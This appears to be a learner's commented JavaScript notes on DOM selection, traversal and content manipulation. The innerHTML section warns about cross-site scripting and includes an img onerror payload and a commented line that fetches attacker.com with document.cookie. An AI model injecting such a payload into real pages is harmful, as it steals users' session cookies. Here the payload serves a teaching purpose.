// 1. The Classic, Specific Methods (The Old Guard)
// These were the original ways to select elements. They are very fast for their specific purpose but are less flexible than the modern methods.

//!  A. document.getElementById('id')
// What it does: Selects the single element that has the specified id.
// Returns: A single element object, or null if no element with that ID is found.
// First Thought: "Get me the one, unique thing with this exact ID."
const mainContainer = document.getElementById('main-container');
mainContainer.style.border = '2px solid red'; // Puts a red border around the main div

const itemList = document.getElementById('item-list');
console.log(itemList);


//!  B. document.getElementsByTagName('tagName')
// What it does: Selects all elements that have the specified tag name (like p, li, div).
// Returns: A live HTMLCollection (an array-like object) of all matching elements.
// First Thought: "Get me all the paragraphs" or "Get me all the list items."
const allParagraphs = document.getElementsByTagName('p');
console.log(allParagraphs.length); // 3

// You can loop through the collection
for (let i = 0; i < allParagraphs.length; i++) {
  allParagraphs[i].style.fontStyle = 'italic';
}



//!  C. document.getElementsByClassName('className')
// What it does: Selects all elements that have the specified class name.
// Returns: A live HTMLCollection of all matching elements.
// First Thought: "Get me everything with the class 'item'."
const allItems = document.getElementsByClassName('item');
console.log(allItems.length); // 3

// You can also get elements with multiple classes
const footerContainer = document.getElementsByClassName('container footer');
console.log(footerContainer[0]);


// 2. The Modern, Powerful Methods (The "Query" Selectors)
// These methods were a game-changer. They allow you to select elements using the same powerful CSS selector syntax that you use in your stylesheets. These are the methods you should use most of the time.

// A. document.querySelector('cssSelector')
// What it does: Selects the first element in the document that matches the specified CSS selector.
// Returns: A single element object, or null if no match is found.
// First Thought: "Find me the very first thing that matches this CSS rule."

// Get the element with the ID 'main-container'
const main = document.querySelector('#main-container');

// Get the FIRST element with the class 'container'
const firstContainer = document.querySelector('.container');
console.log(firstContainer); // This will be the main div, not the footer

// Get the FIRST paragraph
const firstP = document.querySelector('p');
console.log(firstP);

// Get the list item that has BOTH 'item' and 'special' classes
const specialItem = document.querySelector('.item.special');
specialItem.style.color = 'orange';

// Get the input with the name 'username'
const usernameInput = document.querySelector('input[name="username"]');



// B. document.querySelectorAll('cssSelector')
// What it does: Selects all elements in the document that match the specified CSS selector.
// Returns: A static NodeList (an array-like object) of all matching elements.
// First Thought: "Find me every single thing that matches this CSS rule."
// Get ALL elements with the class 'container'
const allContainers = document.querySelectorAll('.container');
console.log(allContainers.length); // 2

// Get ALL list items inside the element with the ID 'item-list'
const listItems = document.querySelectorAll('#item-list li');

// A NodeList has a .forEach method, which is very convenient!
listItems.forEach(item => {
  item.style.fontWeight = 'bold';
});




// ! 3. Other, More Niche Selections

// document.getElementsByName('name'): Selects elements based on their name attribute (most commonly used for form elements).

const loginForm = document.getElementsByName('login-form');
const usernameInputByName = document.getElementsByName('username');


// Traversing the DOM: Once you have one element, you can navigate to its relatives.

const itemLists = document.getElementById('item-list');

const parentContainer = itemList.parentElement; // The #main-container div
const listChildren = itemList.children; // An HTMLCollection of the 3 <li> elements
const firstLi = itemList.firstElementChild; // The first <li>
const lastLi = itemList.lastElementChild; // The last <li>

const specialLi = document.querySelector('.special');
const nextItem = specialLi.nextElementSibling; // The 3rd <li>
const prevItem = specialLi.previousElementSibling; // The 1st <li>


// ! Properties for Manipuating Content 

// ? .TextContent (The Safe and Recommended Choice)
const desc = document.getElementById('description');
console.log(desc.textContent);
// Output: "These headphones have noise-cancelling features."
// Notice the <strong> tags are gone.

const productName = document.getElementById('product-name');
console.log(productName.textContent);
// Output: "Smart Headphones SALE"
// It includes text from hidden elements but ignores comments.



// When Writing (Safe); 
 const descr = document.getElementById('description');

// Let's try to inject some HTML
desc.textContent = "Click <a href='#'>here</a> to win!";

// The browser will display the literal text, not a clickable link:
// "Click <a href='#'>here</a> to win!"


// ! .innerHTML  (The Powerful but Dangerous Choice)

const desc = document.getElementById('description');
console.log(desc.innerHTML);
// Output: "These headphones have <strong>noise-cancelling</strong> features."
// It includes the HTML tags as a string.


// When Writing (Dangerous);
const desc = document.getElementById('description');

// This is powerful and useful for creating new elements.
desc.innerHTML = "Updated features: <strong>Active Noise Cancelling</strong> and <em>Bluetooth 5.0</em>.";
// The browser will correctly render the bold and italic text.

// SECURITY RISK: What if the string comes from a malicious user?
let userInput = `<img src="x" onerror="alert('You have been hacked!')">`;
// desc.innerHTML = userInput; // This would execute the malicious script!

// <img src="x" onerror="fetch('https://attacker.com?cookie=' + document.cookie)">

// .inner Text 
const productNames = document.getElementById('product-name');
console.log(productNames.innerText);
// Output: "SMART HEADPHONES" (if CSS `text-transform: uppercase` was applied)
// It will NOT include the text from the hidden <span> ("SALE").

// Todo 2. Properties for Manipulating Attributes
// A. .id and .className (Direct Properties)
// For the most common attributes like id and class, JavaScript provides direct properties.

// .id: Gets or sets the id attribute.

const card = document.getElementById('product-card');
console.log(card.id); // "product-card"
card.id = 'new-card-id'; // Changes the element's ID


// .className: Gets or sets the entire class attribute as a single string. Because it overwrites everything, .className is clumsy. The .classList property is much better.

console.log(card.className); // "card featured"

// This will OVERWRITE all existing classes.
card.className = "card-dark-mode";
// The element now only has the class "card-dark-mode". "featured" is gone.


// B. .classList (The Modern Way to Handle Classes)
// First Thought: "Give me a smart toolbox for adding, removing, and checking for classes without messing up the other ones."

// What it is: An object with helpful methods to manage an element's classes.

// .add('className'): Adds a new class.
// .remove('className'): Removes a class.
// .toggle('className'): Adds the class if it's missing, removes it if it's present.
// .contains('className'): Returns true or false if the element has the class.
const card = document.getElementById('product-card');

card.classList.add('in-cart');      // Adds 'in-cart'
card.classList.remove('featured'); // Removes 'featured'

// Toggle a 'selected' class every time a function is called
card.classList.toggle('selected');

if (card.classList.contains('in-cart')) {
  console.log("This item is in the cart.");
}


// C. .getAttribute() and .setAttribute() (For Any Attribute)
// These are generic methods that can work with any HTML attribute, including custom ones.

const card = document.getElementById('product-card');

// Add a custom data attribute
card.setAttribute('data-product-id', 'xyz-123');

// Get the value of an attribute
const productId = card.getAttribute('data-product-id');
console.log(productId); // "xyz-123"

// Remove an attribute
card.removeAttribute('class');


//  The .style Property
// First Thought: "Give me direct control over the element's inline styles."
// What it does: An object that represents the style="..." attribute of an element. You can change CSS properties through it.
// The "Gotcha": Property Names are camelCased. CSS properties with hyphens (like background-color) must be written in camelCase in JavaScript.
// background-color -> backgroundColor
// font-size -> fontSize
// z-index -> zIndex
const title = document.querySelector('.title');

title.style.color = 'blue';
title.style.backgroundColor = '#f0f0f0'; // Note the camelCase
title.style.fontSize = '24px'; // The value must be a string
title.style.padding = '10px';
